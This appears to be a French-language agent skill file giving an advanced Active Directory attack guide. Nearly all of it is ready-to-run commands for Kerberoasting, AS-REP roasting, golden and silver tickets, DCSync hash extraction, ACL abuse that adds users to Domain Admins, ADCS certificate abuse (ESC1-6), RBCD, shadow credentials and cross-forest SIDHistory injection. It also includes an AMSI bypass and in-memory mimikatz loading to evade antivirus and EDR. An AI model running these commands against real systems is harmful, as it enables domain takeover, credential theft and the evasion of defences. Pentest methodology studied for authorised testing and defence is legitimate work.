---
name: active-directory-advanced
description: Guide complet d'exploitation Active Directory avancée — Kerberos attacks, ACL abuse, ADCS/PKI, RBCD, Shadow Credentials, DCSync, forêts
category: cybersecurite
---

# Active Directory — Attaques Avancées

## Prérequis Outils

```bash
# BloodHound (analyse de chemins)
apt install bloodhound
# ou BloodHound.py (version Python)
pip install bloodhound

# Impacket — couteau suisse AD
git clone https://github.com/fortra/impacket
pip install impacket

# Mimikatz (Windows)
# Certipy — ADCS exploitation
pip install certipy-ad

# netexec (ex CrackMapExec)
pip install netexec

# PKINIT Tools
pip install pkinittools

# ADSI Edit, LDP (Windows natif)
```

## Énumération AD

### Découverte initiale
```bash
# LDAP anonymous bind (si activé!)
ldapsearch -x -H ldap://dc.target.com -b "DC=target,DC=com"

# Sans auth
nxc ldap dc.target.com -u '' -p ''

# NetBIOS
nmblookup -A dc.target.com

# DNS zone transfer
dig axfr @dc.target.com target.com
```

### Énumération Ldap
```bash
# Avec credentials
ldapsearch -H ldap://dc.target.com -x -D "user@target.com" -w "password" -b "DC=target,DC=com" "(objectClass=*)"

# BloodHound — collecte de données
bloodhound-python -u user -p 'password' -d target.com -dc dc.target.com -c All -ns 10.10.10.10

# Énumération avec nxc
nxc ldap dc.target.com -u user -p 'password' --users
nxc ldap dc.target.com -u user -p 'password' --groups
nxc ldap dc.target.com -u user -p 'password' --trusted-for-delegation
```

## Kerberos Attacks

### Kerberoasting
```bash
# Demander un TGS pour un SPN, le cracker offline
# Impacket
GetUserSPNs.py target.com/user:'password' -dc-ip 10.10.10.10 -request
GetUserSPNs.py target.com/user:'password' -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt

# netexec
nxc ldap dc.target.com -u user -p 'password' --kerberoast output.txt

# Crack avec hashcat
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### AS-REP Roasting
```bash
# Cibler les comptes sans pré-authentification Kerberos
GetNPUsers.py target.com/user:'password' -dc-ip 10.10.10.10 -request
GetNPUsers.py target.com/user:'password' -dc-ip 10.10.10.10 -request -outputfile asreproast.txt
GetNPUsers.py target.com/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10

# netexec
nxc ldap dc.target.com -u user -p 'password' --asreproast asreproast.txt

# Crack avec hashcat
hashcat -m 18200 asreproast.txt rockyou.txt
```

### Golden Ticket
```bash
# Requiert le hash KRBTGT (DCSync)
mimikatz # lsadump::dcsync /domain:target.com /user:krbtgt
mimikatz # kerberos::golden /domain:target.com /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator /id:500 /ptt

# Avec Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain target.com Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py target.com/Administrator@dc.target.com -k -no-pass
```

### Silver Ticket
```bash
# Hash du service cible (ex: CIFS pour SMB)
mimikatz # kerberos::golden /domain:target.com /sid:S-1-5-21-... /target:dc.target.com /service:CIFS /rc4:<hash> /user:Administrator /ptt

# Accès aux fichiers
dir \\dc.target.com\C$
```

### DCSync (Extraction de hash)
```bash
# Requiert: Replicating Directory Changes (DS-Replication-Get-Changes-All)
mimikatz # lsadump::dcsync /domain:target.com /user:Administrator

# Avec impacket
secretsdump.py target.com/Administrator:'password'@dc.target.com
secretsdump.py -hashes :<NTLM> target.com/Administrator@dc.target.com -just-dc
secretsdump.py target.com/Administrator@dc.target.com -just-dc-ntlm
```

## ACL Abuse (BloodHound)

### Permissions dangereuses
```bash
# GenericAll → tous les droits sur l'objet
# GenericWrite → modifier les attributs
# WriteOwner → devenir propriétaire
# WriteDACL → modifier les permissions
# ForceChangePassword → réinitialiser le password
# AllExtendedRights → inclut ForceChangePassword + DCSync-like
# AddMember → ajouter des utilisateurs à un groupe
# Self-Membership → se rajouter à un groupe

# GenericAll sur un User
bloodhound> MATCH (u:User) -[r:GenericAll]-> (target:User) RETURN u.name, target.name

# Exploitation via impacket/powerview
# ForceChangePassword
net rpc password <target> <new_pass> -U domain/User -S DC.target.com

# AddMember (rajouter au groupe Domain Admins)
net rpc group addmem "Domain Admins" attacker -U domain/attacker -S DC.target.com

# WriteDacl (s'ajouter GenericAll)
# Utiliser powerview.ps1
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
```

### BloodHound — Workflow d'exploitation
```bash
# 1. Collecter les données
bloodhound-python -u user -p 'password' -d target.com -dc dc.target.com -c All -ns 10.10.10.10

# 2. Charger dans BloodHound
# Importer le zip dans l'UI

# 3. Requêtes importantes
# Find all Domain Admins
MATCH p=(m:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@TARGET.COM'}) RETURN p

# Shortest paths to Domain Admins
MATCH p=shortestPath((n:User {name:'USER@TARGET.COM'})-[*1..]->(m:Group {name:'DOMAIN ADMINS@TARGET.COM'})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

# AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# ACL attack paths
MATCH p=(u:User)-[r]->(g:Group) WHERE r.isacl=true RETURN p

# Find computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

## ADCS (Active Directory Certificate Services)

### ESC1 — Certificate Template Misconfiguration
```bash
# Template avec Client Authentication + ANY purpose + ENROLLMENT rights
# Vérifier: ManagerApproval = False, AuthorizedSignatures = 0
# Requiert: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# Avec Certipy
certipy-ad find -u user@target.com -p 'password' -dc-ip 10.10.10.10

# Exploitation ESC1
certipy-ad req -u user@target.com -p 'password' -ca CA-SERVER -template VulnTemplate -target dc.target.com -upn administrator@target.com
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC2 — Any Purpose EKU
```bash
# Template avec Any Purpose EKU
# Permet de demander un certificat valide pour tout usage

certipy-ad req -u user@target.com -p 'password' -ca CA-SERVER -template VulnTemplate2 -target dc.target.com -upn administrator@target.com
```

### ESC3 — Agent Enrollment
```bash
# Deux templates: un Agent template + un autre template
# Exploitation pour obtenir un certificat au nom d'un admin

certipy-ad req -u user@target.com -p 'password' -ca CA-SERVER -template EnrollmentAgent -target dc.target.com
certipy-ad req -u user@target.com -p 'password' -ca CA-SERVER -template User -target dc.target.com -on-behalf-of 'domain\administrator' -pfx agent.pfx
```

### ESC4 — Vulnerable Template ACL
```bash
# L'utilisateur a des droits d'écriture sur le template
# Modifier le template pour le rendre vulnérable ESC1

certipy-ad template -u user@target.com -p 'password' -template VulnTemplate -save-old
# Puis demander un cert admin
```

### ESC5 — CA Object ACL / ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
```bash
# ESC5: Contrôle sur l'objet CA → modifier les templates
# ESC6: SAN (Subject Alternative Name) editable
# → Demander un certificat en tant qu'admin

certipy-ad req -u user@target.com -p 'password' -ca CA-SERVER -template User -target dc.target.com -upn administrator@target.com
```

## Resource-Based Constrained Delegation (RBCD)

```bash
# Requiert: Write access to computer object (GenericAll/GenericWrite)

# Avec Powermad
New-MachineAccount -MachineName FAKECOMPUTER -Password $(ConvertTo-SecureString 'password123' -AsPlainText -Force)

# Configurer RBCD
Set-DomainRBCD -Identity TARGET$ -DelegateFrom 'FAKECOMPUTER$'

# Demander un TGS pour le service cible
getST.py -spn cifs/target.target.com target.com/FAKECOMPUTETR$:'password123' -impersonate Administrator

# Utiliser le TGS
export KRB5CCNAME=Administrator.ccache
psexec.py target.com/Administrator@target.target.com -k -no-pass
```

## Shadow Credentials

```bash
# Ajouter des Key Credentials à un objet (nécessite GenericAll/GenericWrite)

# Avec Certipy
certipy-ad shadow auto -u user@target.com -p 'password' -account targetcomputer$

# Authentification PKINIT
gettgtpkinit.py -cert-pfx shadow.pfx -pfx-pass password target.com/Administrator administrator.ccache
```

## Cross-Forest / Trust Attacks

### SIDHistory Injection
```bash
# SIDHistory non filtré → injection d'un SID Enterprise Admin
mimikatz # kerberos::golden /domain:current.local /sid:S-1-5-21-... /sids:S-1-5-21-<FOREST>-519 /krbtgt:<hash> /user:Administrator /ptt

# Extra SID dans le Golden Ticket → accès à l'autre domaine
```

### Inter-Realm TGT
```bash
# Utiliser un TGT d'un domaine pour accéder aux ressources d'un domaine approuvé
# Si le trust est non filtré

mimikatz # kerberos::golden /user:Administrator /domain:child.target.com /sid:S-1-5-21-... /sids:S-1-5-21-<ROOT>-519 /krbtgt:<hash> /ptt
```

### DCSync Cross-Forest
```bash
# Si un compte du domaine A a des droits DCSync sur le domaine B
secretsdump.py target.com/user:'password'@dc.target.com -just-dc
```

## Contournement AV/EDR pour AD

```bash
# Utiliser des outils en mémoire (PowerShell sans fichier)
# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# .NET reflection pour charger des assemblies
# Mimikatz en mémoire
$m = [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\Windows\Temp\mimikatz.exe"))
$m.GetType('Mimikatz').GetMethod('Init').Invoke($null, @())

# Utiliser BOF (Beacon Object Files) avec Cobalt Strike ou alternatives
```

## Checklist Pentest AD

1. Énumération LDAP (users, groups, computers, SPNs)
2. BloodHound data collection + analyse de chemin
3. Kerberoasting (TGS crack)
4. AS-REP Roasting
5. ASREQ / Password Spray (mots de passe faibles)
6. ACL Abuse (GenericAll, WriteDACL, etc.)
7. ADCS exploitation (ESC1-8)
8. Delegation abuse (Unconstrained, Constrained, RBCD)
9. Shadow Credentials attack
10. DCSync / Privileged account extraction
11. Golden/Silver ticket
12. Skeleton Key (mimikatz)
13. DCOM / WMI / PsExec lateral movement
14. Cross-forest trust exploitation
15. SMB / Pass-the-Hash, Pass-the-Ticket

## Ressources

- **HackTricks AD**: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound
- **Certipy**: https://github.com/ly4k/Certipy
- **Impacket**: https://github.com/fortra/impacket
- **adPEAS**: https://github.com/61106960/adPEAS
- **PayloadsAllTheThings AD**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack